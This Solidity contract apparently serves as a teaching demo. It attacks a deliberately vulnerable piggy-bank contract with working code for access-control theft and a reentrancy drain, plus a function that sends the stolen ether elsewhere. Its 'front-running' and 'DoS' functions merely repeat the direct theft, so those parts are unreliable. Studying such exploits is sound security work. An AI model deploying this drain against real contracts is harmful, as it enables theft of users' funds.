// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./VulnerablePiggyBank.sol";

/**
 * @title PiggyBankAttacker
 * @dev Demonstrates various attack vectors against the VulnerablePiggyBank contract
 */
contract PiggyBankAttacker {
    VulnerablePiggyBank public vulnerablePiggyBank;

    // Track attack attempts
    uint256 public attackCount;
    uint256 public totalStolen;

    event AttackExecuted(uint256 attackNumber, uint256 amountStolen);
    event ReentrancyAttack(uint256 attackNumber, uint256 amountStolen);

    /**
     * @dev Constructor sets the target vulnerable contract
     * @param _vulnerablePiggyBank Address of the vulnerable contract
     */
    constructor(address _vulnerablePiggyBank) {
        vulnerablePiggyBank = VulnerablePiggyBank(_vulnerablePiggyBank);
    }

    /**
     * @dev Attack 1: Direct fund theft (Access Control Vulnerability)
     * Anyone can call withdraw() and steal all funds
     */
    function attackDirectTheft() external {
        uint256 contractBalance = address(vulnerablePiggyBank).balance;
        require(contractBalance > 0, "No funds to steal");

        // This will drain ALL funds from the contract
        vulnerablePiggyBank.withdraw();

        attackCount++;
        totalStolen += contractBalance;

        emit AttackExecuted(attackCount, contractBalance);
    }

    /**
     * @dev Attack 2: Reentrancy Attack
     * Exploits the reentrancy vulnerability to drain funds multiple times
     */
    function attackReentrancy() external payable {
        require(msg.value > 0, "Must send some ETH to attack");

        // First, deposit some ETH to the vulnerable contract
        vulnerablePiggyBank.deposit{value: msg.value}();

        // Then trigger the reentrancy attack
        vulnerablePiggyBank.withdraw();

        attackCount++;
        totalStolen += msg.value;

        emit ReentrancyAttack(attackCount, msg.value);
    }

    /**
     * @dev Attack 3: Front-running attack simulation
     * This demonstrates how the lack of access control makes front-running possible
     */
    function attackFrontRunning() external {
        // In a real scenario, this would be called by a MEV bot
        // that monitors the mempool for deposit transactions
        uint256 contractBalance = address(vulnerablePiggyBank).balance;
        if (contractBalance > 0) {
            vulnerablePiggyBank.withdraw();
            attackCount++;
            totalStolen += contractBalance;

            emit AttackExecuted(attackCount, contractBalance);
        }
    }

    /**
     * @dev Attack 4: DoS attack simulation
     * This demonstrates how the transfer() function can be exploited
     */
    function attackDoS() external {
        // This attack would work if the recipient has a complex fallback function
        // that consumes more than 2300 gas, causing the transfer to fail
        // In this case, we're just demonstrating the concept
        uint256 contractBalance = address(vulnerablePiggyBank).balance;
        if (contractBalance > 0) {
            try vulnerablePiggyBank.withdraw() {
                attackCount++;
                totalStolen += contractBalance;
                emit AttackExecuted(attackCount, contractBalance);
            } catch {
                // Transfer failed due to gas limit - DoS achieved
                emit AttackExecuted(attackCount, 0);
            }
        }
    }

    /**
     * @dev Receive function for reentrancy attacks
     * This is called when the vulnerable contract sends ETH back
     */
    receive() external payable {
        // If we receive ETH from the vulnerable contract, try to attack again
        if (address(vulnerablePiggyBank).balance >= msg.value) {
            // This creates a reentrancy attack
            vulnerablePiggyBank.withdraw();
        }
    }

    /**
     * @dev Fallback function for additional attack vectors
     */
    fallback() external payable {
        // Additional attack logic can be implemented here
    }

    /**
     * @dev Get attack statistics
     * @return _attackCount Number of successful attacks
     * @return _totalStolen Total amount stolen
     * @return _attackerBalance Current balance of attacker contract
     */
    function getAttackStats()
        external
        view
        returns (
            uint256 _attackCount,
            uint256 _totalStolen,
            uint256 _attackerBalance
        )
    {
        return (attackCount, totalStolen, address(this).balance);
    }

    /**
     * @dev Withdraw stolen funds to the attacker's address
     * @param recipient Address to send stolen funds to
     */
    function withdrawStolenFunds(address payable recipient) external {
        require(recipient != address(0), "Invalid recipient");
        require(address(this).balance > 0, "No funds to withdraw");

        uint256 balance = address(this).balance;
        (bool success, ) = recipient.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
